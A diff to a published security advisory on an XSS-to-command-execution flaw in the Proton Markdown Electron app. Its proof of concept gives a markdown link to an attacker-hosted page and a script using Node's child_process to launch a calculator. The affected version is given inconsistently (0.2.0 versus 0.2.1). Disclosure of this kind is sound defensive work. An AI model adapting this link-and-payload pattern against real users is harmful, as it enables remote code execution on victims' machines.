@@ -23,7 +23,8 @@ template: advisory
 | **Code name**           | [Lennon](https://en.wikipedia.org/wiki/John_Lennon)        |
 | **Product**             | Proton Markdown                                            |
 | **Affected versions**   | Version 0.2.0                                              |
-| **State**               | Unpublished/Contacted Vendor                               |
+| **State**               | Public                                                     |
+| **Release date**        | 2022-05-17                                                 |
 
 ## Vulnerability
 
@@ -39,23 +40,51 @@ template: advisory
 
 ## Description
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+Proton **v0.2.1** allows an attacker to create a malicious
+link inside a markdown file. When the victim clicks the link,
+the application opens the site in the current frame allowing
+an attacker to host JavaScript code in the malicious link in
+order to trigger an XSS attack. The `nodeIntegration` configuration
+is set to **on** which allows the webpage to use `NodeJs` features,
+an attacker can leverage this to run OS commands.
 
 ## Proof of Concept
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+### Steps to reproduce
+
+1. Create a markdown file with the following content.
+
+   ```javascript
+   [Click me!!!](http://192.168.1.67:8002/rce.html)
+   ```
+
+2. Host the `rce.html` file with the following
+   content on a server controlled by the attacker.
+
+   ```javascript
+    <script>
+        require('child_process').exec('calc');
+    </script>
+   ```
+
+3. Send the markdown file to the victim.
+   When the victim clicks the markdown link the site
+   will be open inside electron and the JavaScript
+   code will spawn a calculator.
+
+### System Information
+
+* Version: Proton v0.2.1.
+* Operating System: Windows 10.0.19042 N/A Build 19042.
+* Installer: Proton.Setup.0.2.0.exe
 
 ## Exploit
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+There is no exploit for the vulnerability but can be manually exploited.
 
 ## Mitigation
 
-This information will be released later according to our
-[Responsible Disclosure Policy](../policy/).
+By 2022-05-17 there is not a patch resolving the issue.
 
 ## Credits
 
@@ -71,6 +100,8 @@ Team of  `Fluid Attacks`.
 
 ## Timeline
 
-- 2022-04-29: Vulnerability discovered.
+* 2022-04-29: Vulnerability discovered.
 
-- 2022-04-29: Vendor contacted.
+* 2022-04-29: Vendor contacted.
+
+* 2022-05-17: Public disclosure.
